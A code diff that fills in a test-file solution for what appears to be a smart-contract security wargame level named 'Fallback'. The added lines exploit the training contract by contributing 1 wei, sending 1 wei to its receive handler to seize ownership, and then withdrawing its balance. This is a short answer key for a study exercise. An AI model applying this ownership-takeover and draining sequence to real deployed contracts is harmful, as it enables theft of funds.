@@ -11,6 +11,10 @@ def test_level_01():
     service.check_level_01(contract)
 
 def do_level_01_solution(contract: Fallback):
-    # TODO Claim ownership of the contract and reduce its balance to 0.
-    # TODO Code here ...
-    pass
+    # Training: payable methods, default recieve method
+    with must_revert(): # contribution too big, not allowed
+        contract.contribute(value=1*10**15) # send 0.001 Eth = 1 * 10^15 Wei (10^18 = 1 ETH)
+    
+    contract.contribute(value=1) # send just 1 Wei
+    contract.transact(value=1) # default recieve 1 Wei
+    contract.withdraw()
